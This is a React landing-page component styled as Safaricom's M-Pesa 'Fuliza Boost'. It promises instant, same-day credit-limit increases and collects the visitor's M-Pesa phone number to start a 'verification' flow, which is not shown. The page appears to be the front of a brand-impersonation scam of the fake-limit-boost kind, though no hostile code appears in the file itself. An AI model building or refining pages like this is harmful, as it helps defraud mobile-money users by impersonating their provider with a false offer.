import React from "react";
import { useState } from 'react';
import { SAFARICOM_GREEN } from '../utils/constants';

export default function LandingPage({ onStartVerification }) {
  const [phone, setPhone] = useState('');

  const handleSubmit = (e) => {
    e.preventDefault();
    if (phone.length >= 10) {
      onStartVerification(phone);
    }
  };

  return (
    <div id="landing-page" className="max-w-2xl mx-auto px-4 py-8">
      <div
        id="check-step"
        className="bg-white p-8 rounded-[2rem] shadow-xl border border-slate-100 text-center mb-10"
      >
        <div className="flex justify-center mb-4">
          <div
            className="w-16 h-16 bg-green-500 rounded-full flex items-center justify-center"
          >
            <i
              className="fas fa-user-shield text-safaricom text-3xl"
              style={{ color: SAFARICOM_GREEN }}
            />
          </div>
        </div>
        <h1 className="text-2xl font-extrabold text-slate-900 mb-1">
          Safaricom M-Pesa Fuliza Boost
        </h1>
        <p
          className="text-[11px] font-bold text-safaricom uppercase tracking-widest mb-6"
          style={{ color: SAFARICOM_GREEN }}
        >
          Instant Limit Increase • Same Day Access
        </p>

        <form onSubmit={handleSubmit}>
          <div className="relative mb-4">
            <i className="fas fa-phone-alt absolute left-4 top-5 text-slate-400" />
            <input
              type="number"
              id="checkPhone"
              value={phone}
              onChange={(e) => setPhone(e.target.value)}
              placeholder="Enter M-Pesa Number"
              className="w-full pl-12 pr-4 py-5 bg-slate-50 border-2 border-slate-100 rounded-2xl focus:border-safaricom outline-none text-lg font-bold"
              style={{ borderColor: SAFARICOM_GREEN }}
            />
          </div>

          <button
            type="submit"
            id="eligibilityBtn"
            className="w-full bg-safaricom text-white font-bold py-5 rounded-2xl shadow-lg active:scale-95 transition-all cursor-pointer hover:bg-green-700"
            style={{ backgroundColor: SAFARICOM_GREEN }}
          >
            Check My Fuliza Increase Eligibility
            <i className="fas fa-chevron-right text-xs ml-2" />
          </button>
        </form>
      </div>
    </div>
  );
}